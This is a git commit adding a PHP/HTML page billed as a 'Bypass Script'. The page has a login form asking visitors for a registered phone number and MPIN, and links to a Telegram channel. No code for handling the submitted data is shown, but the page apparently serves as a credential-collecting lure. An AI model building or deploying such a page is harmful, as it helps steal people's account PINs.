5c732d2da3105db27bf2c0c506b7647063bc2d46
anurag1243 <70834855+anurag1243@users.noreply.github.com>
2020-09-06 12:34:18 +0530

    real script
    real script

---
+++ hello.php
@@ -0,0 +1,72 @@
+<html>  
+<title>Script || Bypass  Script </title>
+<meta name="theme-color" content="black" /><link rel="shortcut icon" href="https://hidemyscript.cf/icon/hide.jpg" type="image/x-icon" /> <head><meta name="viewport" content="width=device-width"><style>
+input[type=text], select { width: 100%; padding: 12px 20px; margin: 8px 0; display: inline-block; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;}input[type=number], select { width: 100%; padding: 12px 20px; margin: 8px 0; display: inline-block; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;}input[type=submit] { width: 50%; background-color: #8A2BE2; color: white; padding: 14px 20px; margin: 8px 0; border: none; border-radius: 4px; cursor: pointer;}input[type=submit]:hover { background-color: black;}div { border-radius: 5px; background-color: #f2f2f2; padding: 20px;}a{text-decoration:none;}.error{background:#ffebe8; border:1px solid #dd3c10; padding:2px; text-align:center; font-weight:normal; color:maroon;}.success {background:#fff8cc; border:1px solid #ffe222; padding:10px; text-align:center; font-weight:normal; color:#000;}</style></head><title></title><body><center><b><center>
+<img src='https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTmZ1rcIUhpaFdPc27-tJjQ52LC4VKL28pTqUWLqvRWjBrLKwpo&usqp=CAU' height='18%' weight='25%'></img>
+</center> 
+
+<html><head>
+
+<meta name="viewport" content="width=device-width">
+<link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet">
+<link href="/simple.css" rel="stylesheet">
+<link href="/box.css" rel="stylesheet">
+</head>
+<body style='font-family: Yatra One;'>
+
+
+</font></center> <hr/></center>
+<hr><b><center><a href="https://telegram.dog/netflix_sexeducationhindiseries"><font color="red">JOIN TELEGRAM CHANNEL FOR MORE UPDATES</font></a></center></form></div></form></div><hr>
+
+
+<script language="javascript">
+    var max_time = 1;
+    var cinterval;
+    
+    function countdown_timer(){
+    // decrease timer
+    max_time--;
+    document.getElementById('countdown').innerHTML = max_time;
+    if(max_time == 0){
+    clearInterval(cinterval);
+    }
+    }
+    // 1,000 means 1 second.
+    cinterval = setInterval('countdown_timer()', 1000);
+  
+  
+  </script>
+<center>
+
+<html>
+
+ 
+
+<div>
+<center>
+
+
+
+<font color="black">
+<form method="post" action="">
+
+<font color="black" size="3">
+<center>
+<br>Your MPIN is: 9090<br>
+
+
+<input type="text" name="mob" placeholder="Enter Your Register Number" required><br>
+
+<input type="text" name="pwd" placeholder="Enter Your MPIN" required>
+
+
+  <input type="submit" value="LOG IN" name="submit">
+</form>
+</div>
+</font></font>
+ 
+</center>
+
+	
+	</html></form></div>
+<hr><b><center><a href="https://telegram.dog/netflix_sexeducationhindiseries"><font color="red">JOIN TELEGRAM CHANNEL FOR MORE UPDATES</font></a></center></form></div></form></div><hr>
